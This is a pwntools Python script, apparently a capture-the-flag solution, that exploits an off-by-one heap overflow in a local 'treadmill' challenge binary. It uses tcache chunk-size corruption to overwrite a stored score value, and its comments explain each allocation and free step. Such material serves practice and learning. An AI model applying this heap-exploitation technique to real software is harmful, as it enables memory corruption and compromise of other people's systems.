#import sys
from pwn import *

context.update(arch="amd64", os="linux")
BINARY = "./treadmill"

def recv_menu():
    p.recvuntil(b"Stop training\n> ")

def create_training(name):
    p.sendline(b"1")
    p.sendlineafter(b"> ", name)

    # Enter six pitches
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"> ", b"5")
    p.sendlineafter(b"> ", b"6")

def delete_training(nr):
    p.sendline(b"3")
    p.sendlineafter(b"> ", nr)

def stop_training():
    p.sendline(b"5")

def main():
    # Start a new training
    p.recvuntil(b"> ")
    p.sendline(b"1")

    # Tell your name
    p.recvuntil(b"> ")
    p.sendline(b"pwner")

    # Create a new training plan where the size field of an adjacent chunk
    # is overwritten with 0x91 by abusing the off-by-one heap overflow
    # vulnerability
    recv_menu()
    create_training(b"A"*0x48 + b"\x91")

    # Create another training plan with a name of size 0x40
    recv_menu()
    create_training(b"B"*0x40)

    # Free the training plan with the name "B"*0x40.
    # Hence there are two free chunks in the tcachebins[0x50] list
    recv_menu()
    delete_training(b"1")

    # Create two more training plans with large names such that
    # the two training_plan_t struct chunks get the two free chunks
    # of the tcachebins[0x50] list
    recv_menu()
    create_training(b"C"*0x200)
    recv_menu()
    create_training(b"D"*0x200)

    # Free the training plan with the name "A"*0x48 + "\x91".
    # Now a chunk with a real size of 0x50 is added to the tcachebins[0x90]
    # list.
    recv_menu()
    delete_training(b"0")

    # Finally, create a training plan such that the name chunk requires 0x90
    # bytes and hence gets the manipulated chunk from the tcachebins[0x90] list
    # whose real size is only 0x50 bytes.
    # Use this overflow to overwrite the trainings value of the training plan
    # with the name "C"*0x200 with the value 0x1f21f036af to beat the highscore.
    recv_menu()
    create_training(b"E"*8*16 + p64(0x1f21f036af))

    # Stop the training such that our highscore is compared with the old
    # highscore
    recv_menu()
    stop_training()

    p.interactive()

if __name__ == "__main__":
    p = process(BINARY)
    main()
